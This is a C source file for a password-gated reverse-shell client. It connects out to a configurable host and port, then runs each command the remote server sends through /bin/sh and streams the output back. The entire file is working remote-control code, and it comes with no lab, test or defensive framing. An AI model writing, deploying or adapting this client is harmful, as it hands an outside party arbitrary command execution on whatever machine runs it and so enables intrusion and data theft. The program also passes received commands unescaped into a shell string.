#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <getopt.h> // Standard POSIX getopt

#define DEFAULT_SERVER_PORT "27015"
#define DEFAULT_SERVER_IP "127.0.0.1"
#define BUFFER_SIZE 1024

// original client code, now exists in a modular form

void error_exit(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [-i <ip/domain>] [-p <port>] [-w <password>]\n", prog_name);
}

const char* get_shell() {
    if (access("/bin/sh", X_OK) == 0) {
        return "/bin/sh";
    }
    if (access("/bin/bash", X_OK) == 0) {
        return "/bin/bash";
    }
    fprintf(stderr, "Error: Neither /bin/sh nor /bin/bash is available.\n");
    exit(EXIT_FAILURE);
}

void execute_command_and_send_output(const char *command, int sockfd) {
    char output_buffer[BUFFER_SIZE];
    FILE *fp;
    const char *shell = get_shell();

    char shell_command[BUFFER_SIZE];
    snprintf(shell_command, BUFFER_SIZE, "%s -c \"%s\"", shell, command);

    fp = popen(shell_command, "r");
    if (fp == NULL) {
        snprintf(output_buffer, BUFFER_SIZE, "Error: Unable to execute command: %s\n", command);
        send(sockfd, output_buffer, strlen(output_buffer), 0);
        snprintf(output_buffer, BUFFER_SIZE, "[END_OF_OUTPUT]\n");
        send(sockfd, output_buffer, strlen(output_buffer), 0);
        return;
    }

    while (fgets(output_buffer, sizeof(output_buffer), fp) != NULL) {
        if (send(sockfd, output_buffer, strlen(output_buffer), 0) < 0) {
            perror("Error: Connection broken while sending command output");
            break;
        }
    }

    if (pclose(fp) == -1) {
        perror("Error: Failed to close command stream");
    }

    snprintf(output_buffer, BUFFER_SIZE, "[END_OF_OUTPUT]\n");
    if (send(sockfd, output_buffer, strlen(output_buffer), 0) < 0) {
        perror("Error: Failed to send end-of-output marker");
    }
}

int authenticate(int sockfd, const char *cmd_line_password) {
    static char password_buffer[BUFFER_SIZE];

    if (cmd_line_password) {
        strncpy(password_buffer, cmd_line_password, BUFFER_SIZE - 1);
        password_buffer[BUFFER_SIZE - 1] = '\0';
    } else {
        printf("Enter server password: ");
        if (fgets(password_buffer, BUFFER_SIZE, stdin) == NULL) {
            fprintf(stderr, "Failed to read password.\n");
            return 0;
        }
        password_buffer[strcspn(password_buffer, "\n")] = '\0';
    }

    if (send(sockfd, password_buffer, strlen(password_buffer), 0) < 0) {
        perror("Failed to send password");
        return 0;
    }

    char recv_buffer[BUFFER_SIZE];
    ssize_t received = recv(sockfd, recv_buffer, BUFFER_SIZE - 1, 0);
    if (received < 0) {
        perror("Failed to receive authentication response");
        return 0;
    }

    recv_buffer[received] = '\0';
    if (strcmp(recv_buffer, "REMOTE_SHELL_CONFIRMED\n") == 0) {
        printf("Authentication successful.\n");
        return 1;
    } else {
        printf("Authentication failed: %s\n", recv_buffer);
        return 0;
    }
}

int resolve_address(const char *host, const char *port, struct addrinfo **result) {
    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    int status = getaddrinfo(host, port, &hints, result);
    if (status != 0) {
        fprintf(stderr, "Error resolving address '%s': %s\n", host, gai_strerror(status));
        return 0;
    }
    return 1;
}

int main(int argc, char *argv[]) {
    int sockfd;
    struct addrinfo *res, *rp;
    char server_input[BUFFER_SIZE] = DEFAULT_SERVER_IP;
    char server_port[BUFFER_SIZE] = DEFAULT_SERVER_PORT;
    char *password = NULL;

    int opt;
    while ((opt = getopt(argc, argv, ":i:p:w:")) != -1) {
        switch (opt) {
            case 'i':
                strncpy(server_input, optarg, BUFFER_SIZE - 1);
                break;
            case 'p':
                strncpy(server_port, optarg, BUFFER_SIZE - 1);
                break;
            case 'w':
                password = optarg;
                break;
            case ':': // Option requires an argument
                fprintf(stderr, "Option -%c requires an argument.\n", optopt);
                print_usage(argv[0]);
                return EXIT_FAILURE;
            case '?': // Unknown option
                fprintf(stderr, "Unknown option: -%c\n", optopt);
                print_usage(argv[0]);
                return EXIT_FAILURE;
            default:
                print_usage(argv[0]);
                return EXIT_FAILURE;
        }
    }

    if (!resolve_address(server_input, server_port, &res)) {
        fprintf(stderr, "Failed to resolve server address.\n");
        return EXIT_FAILURE;
    }

    for (rp = res; rp != NULL; rp = rp->ai_next) {
        sockfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sockfd < 0) {
            perror("Socket creation failed, trying next address");
            continue;
        }

        if (connect(sockfd, rp->ai_addr, rp->ai_addrlen) == 0) {
            char address_str[INET6_ADDRSTRLEN];
            void *addr;
            if (rp->ai_family == AF_INET) {
                addr = &((struct sockaddr_in *)rp->ai_addr)->sin_addr;
            } else {
                addr = &((struct sockaddr_in6 *)rp->ai_addr)->sin6_addr;
            }
            inet_ntop(rp->ai_family, addr, address_str, sizeof(address_str));
            printf("Connected to server at %s:%s\n", address_str, server_port);
            break;
        }

        close(sockfd);
    }

    freeaddrinfo(res);

    if (rp == NULL) {
        fprintf(stderr, "Failed to connect to server.\n");
        return EXIT_FAILURE;
    }

    if (!authenticate(sockfd, password)) {
        close(sockfd);
        return EXIT_FAILURE;
    }

    char recv_buffer[BUFFER_SIZE];
    while (1) {
        ssize_t received = recv(sockfd, recv_buffer, BUFFER_SIZE - 1, 0);
        if (received < 0) {
            perror("Receive failed");
            break;
        } else if (received == 0) {
            printf("Server closed the connection.\n");
            break;
        }

        recv_buffer[received] = '\0';

        if (strcmp(recv_buffer, "exit") == 0 || strcmp(recv_buffer, "quit") == 0) {
            printf("Exiting on server request...\n");
            break;
        }

        printf("Executing command: %s\n", recv_buffer);
        execute_command_and_send_output(recv_buffer, sockfd);
    }

    close(sockfd);
    printf("Disconnected from server.\n");
    return EXIT_SUCCESS;
}